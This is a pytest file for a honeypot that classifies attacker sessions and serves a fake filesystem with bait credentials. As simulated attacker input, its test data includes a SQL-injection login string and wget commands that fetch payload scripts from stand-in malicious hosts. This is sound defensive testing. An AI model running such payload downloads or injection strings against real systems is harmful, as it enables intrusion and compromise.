"""
test_adaptive_deception.py
==========================
Unit and integration tests for behavior-based classification and the adaptive fake filesystem.
"""
import os
import sys
import time
import pytest
import requests

# Add live_monitor to path to test classifier directly
sys.path.append(os.path.join(os.path.dirname(__file__), "live_monitor"))
from classifier import extract_features, heuristic_classify, classify_session

BASE = "http://127.0.0.1:5000"
TIMEOUT = 5

def _get_attacker_session():
    """Returns a Flask request Session flagged as an attacker."""
    s = requests.Session()
    r = s.post(f"{BASE}/login", timeout=TIMEOUT, allow_redirects=True,
               data={"username": "' OR 1=1--", "password": "hack"})
    assert r.status_code == 200
    return s

# ── 1. Classifier Unit Tests ───────────────────────────────────────────────

def test_classifier_scanner():
    """Verify scanner classification for small number of basic commands."""
    commands = [
        {"command": "whoami", "timestamp": "2026-06-12 12:00:00"},
        {"command": "pwd", "timestamp": "2026-06-12 12:00:05"}
    ]
    features = extract_features(commands)
    assert features[0] == 2  # command_count
    assert features[5] == 0  # no downloads
    
    cls, conf, level, score, interest = classify_session(commands)
    assert cls == "Scanner"
    assert level == "LOW"
    assert interest == "Reconnaissance"

def test_classifier_bot_downloads():
    """Verify immediate Bot classification on downloads."""
    commands = [
        {"command": "wget http://malicious.com/payload.sh", "timestamp": "2026-06-12 12:00:00"}
    ]
    features = extract_features(commands)
    assert features[5] == 1  # 1 download
    
    cls, conf, level, score, interest = classify_session(commands)
    assert cls == "Bot"
    assert level == "HIGH"
    assert interest == "Malware"

def test_classifier_human():
    """Verify Human classification when typing speed is natural."""
    commands = [
        {"command": "ls", "timestamp": "2026-06-12 12:00:00"},
        {"command": "cd Documents", "timestamp": "2026-06-12 12:00:10"},
        {"command": "ls -l", "timestamp": "2026-06-12 12:00:20"},
        {"command": "cat passwords.txt", "timestamp": "2026-06-12 12:00:30"},
        {"command": "whoami", "timestamp": "2026-06-12 12:00:40"},
        {"command": "id", "timestamp": "2026-06-12 12:00:50"},
        {"command": "hostname", "timestamp": "2026-06-12 12:01:00"},
        {"command": "uname -a", "timestamp": "2026-06-12 12:01:10"},
        {"command": "pwd", "timestamp": "2026-06-12 12:01:20"},
        {"command": "cd ~", "timestamp": "2026-06-12 12:01:30"}
    ]
    cls, conf, level, score, interest = classify_session(commands)
    assert cls in ["Human", "Script Kiddie", "APT"]

# ── 2. Fake Filesystem Integration Tests ───────────────────────────────────

def test_fake_filesystem_ls():
    """Test that ls lists passwords.txt and mysql_backup.sql."""
    s = _get_attacker_session()
    r = s.post(f"{BASE}/honeypot-command", json={"cmd": "ls", "cwd": "~"}, timeout=TIMEOUT)
    assert r.status_code == 200
    res = r.json()
    assert "passwords.txt" in res["response"]
    assert "mysql_backup.sql" in res["response"]

def test_fake_filesystem_cat_passwords():
    """Test reading credentials from passwords.txt."""
    s = _get_attacker_session()
    r = s.post(f"{BASE}/honeypot-command", json={"cmd": "cat passwords.txt", "cwd": "~"}, timeout=TIMEOUT)
    assert r.status_code == 200
    res = r.json()
    assert "admin123" in res["response"]
    assert "Password@2025" in res["response"]
    assert "welcome123" in res["response"]
    assert res["style_class"] == "warn"

def test_fake_filesystem_mysql():
    """Test that connecting to mysql exposes fake databases."""
    s = _get_attacker_session()
    r = s.post(f"{BASE}/honeypot-command", json={"cmd": "mysql", "cwd": "~"}, timeout=TIMEOUT)
    assert r.status_code == 200
    res = r.json()
    assert "customer_db" in res["response"]
    assert "admin_db" in res["response"]
    assert "employee_db" in res["response"]
    assert res["style_class"] == "info"

def test_fake_filesystem_wget():
    """Test that downloading payload transitions classifier profile state."""
    s = _get_attacker_session()
    r = s.post(f"{BASE}/honeypot-command", json={"cmd": "wget http://evil.com/payload.sh", "cwd": "~"}, timeout=TIMEOUT)
    assert r.status_code == 200
    res = r.json()
    assert "Downloading payload" in res["response"]
    assert "malware_agent" in res["response"]
    assert res["style_class"] == "err"

def test_monitor_ingest_classification():
    """Test live monitor ingestion updates correctly from command stream."""
    session_id = f"test_mon_{int(time.time())}"
    monitor_url = "http://127.0.0.1:6001/api/ingest"
    
    # Send normal commands
    r1 = requests.post(monitor_url, json={
        "session_id": session_id,
        "src_ip": "127.0.0.1",
        "command": "whoami",
        "response": "admin",
        "timestamp": "2026-06-12T12:00:00Z"
    }, timeout=TIMEOUT)
    assert r1.status_code == 200
    
    # Query monitor to check classification
    r_check1 = requests.get(f"http://127.0.0.1:6001/api/session/{session_id}", timeout=TIMEOUT)
    assert r_check1.status_code == 200
    sess_data1 = r_check1.json()
    assert sess_data1["attacker_type"] == "Scanner"
    
    # Send download command
    r2 = requests.post(monitor_url, json={
        "session_id": session_id,
        "src_ip": "127.0.0.1",
        "command": "wget http://evil.com/payload",
        "response": "Downloading...",
        "timestamp": "2026-06-12T12:00:10Z"
    }, timeout=TIMEOUT)
    assert r2.status_code == 200
    
    # Query monitor again
    r_check2 = requests.get(f"http://127.0.0.1:6001/api/session/{session_id}", timeout=TIMEOUT)
    assert r_check2.status_code == 200
    sess_data2 = r_check2.json()
    assert sess_data2["attacker_type"] == "Bot"
    assert sess_data2["interest"] == "Malware"
    assert sess_data2["threat_score"] >= 70


def test_session_isolation_and_logout():
    """
    Test flow:
    1. Post incorrect credentials -> should not log in, count fails
    2. Try 3 failed logins -> should get flagged as attacker, redirecting to /admin
    3. Visit /login -> should see login page (returns 200, handles attacker session)
    4. Post CORRECT credentials -> should clear attacker flag, redirect to real dashboard
    5. Visit /dashboard -> should load real dashboard correctly (contains 'Welcome')
    6. Visit /logout -> should clear session, redirect to /login
    7. Visit /dashboard -> should redirect to login (since not logged in)
    """
    # Create request Session
    s = requests.Session()

    # 0. Initialize by logging in successfully first to reset _failed_logins counter for this IP
    r_init = s.post(f"{BASE}/login", data={"username": "admin", "password": "admin"}, timeout=TIMEOUT, allow_redirects=True)
    assert r_init.status_code == 200
    s.get(f"{BASE}/logout", timeout=TIMEOUT)

    # 1. Invalid login attempts
    for i in range(2):
        r = s.post(f"{BASE}/login", data={"username": "admin", "password": f"wrong_{i}"}, timeout=TIMEOUT)
        assert r.status_code == 200
        assert "Invalid credentials" in r.text

    # 2. Trigger 3rd failed login -> honeypot mode activates, redirects to fake /admin
    r_trigger = s.post(f"{BASE}/login", data={"username": "admin", "password": "wrong_last"}, timeout=TIMEOUT, allow_redirects=True)
    assert r_trigger.status_code == 200
    assert "Admin Panel" in r_trigger.text or "CorpNet" in r_trigger.text

    # 3. Post CORRECT credentials -> should clear attacker state and log in to real dashboard
    r_correct = s.post(f"{BASE}/login", data={"username": "admin", "password": "admin"}, timeout=TIMEOUT, allow_redirects=True)
    assert r_correct.status_code == 200
    assert "Employee Directory" in r_correct.text
    assert "pending approvals" in r_correct.text.lower()

    # 4. Visit real dashboard -> should succeed and contain real dashboard components
    r_dash = s.get(f"{BASE}/dashboard", timeout=TIMEOUT)
    assert r_dash.status_code == 200
    assert "pending approvals" in r_dash.text.lower()
    
    # Check headers for cache prevention
    assert "no-store" in r_dash.headers.get("Cache-Control", "").lower()
    assert "no-cache" in r_dash.headers.get("Cache-Control", "").lower()

    # 5. Logout -> should clear session and redirect to login
    r_logout = s.get(f"{BASE}/logout", timeout=TIMEOUT, allow_redirects=True)
    assert r_logout.status_code == 200
    # Now that session is cleared, we should see the real login page and not be authenticated
    assert "Sign In" in r_logout.text

    # 6. Try to visit dashboard again -> should redirect to login
    r_dash_post_logout = s.get(f"{BASE}/dashboard", timeout=TIMEOUT, allow_redirects=True)
    assert "Sign In" in r_dash_post_logout.text
    assert "pending approvals" not in r_dash_post_logout.text.lower()

